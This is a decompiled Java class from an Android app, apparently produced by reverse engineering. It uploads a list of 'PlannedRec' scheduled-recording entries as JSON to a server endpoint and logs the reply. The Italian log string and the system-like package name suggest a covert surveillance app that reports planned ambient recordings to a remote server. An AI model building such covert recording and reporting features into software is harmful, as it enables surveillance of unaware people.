package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.entity.PlannedRec;
import com.app.system.common.h;
import com.google.gson.f;
import java.io.IOException;
import java.util.List;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class n
  extends a
{
  public n(String paramString)
  {
    super(null, paramString);
  }
  
  public int a(Context paramContext, List<PlannedRec> paramList)
  {
    try
    {
      Object localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      ((StringBuilder)localObject).append("INVIO LISTA REG.AMB. (tot.");
      ((StringBuilder)localObject).append(paramList.size());
      ((StringBuilder)localObject).append(")");
      h.a(paramContext, ((StringBuilder)localObject).toString());
      paramContext = new java/lang/StringBuilder;
      paramContext.<init>();
      paramContext.append(this.c);
      paramContext.append("/PlannedRec");
      paramContext.append('/');
      paramContext.append(this.a);
      localObject = com.app.system.common.d.a.a.a.a(paramContext.toString(), h.b().a(paramList));
      if (localObject != null)
      {
        paramList = ((Response)localObject).body().string();
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append("SendList Result: ");
        paramContext.append(localObject);
        com.security.d.a.d("ProtocolForPlannedRecs", paramContext.toString(), new Object[0]);
        boolean bool = paramList.equals("1");
        if (bool) {
          return 1;
        }
      }
    }
    catch (IOException paramContext)
    {
      com.security.d.a.a("ProtocolForPlannedRecs", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/n.class
 *
 * Reversed by:           J
 */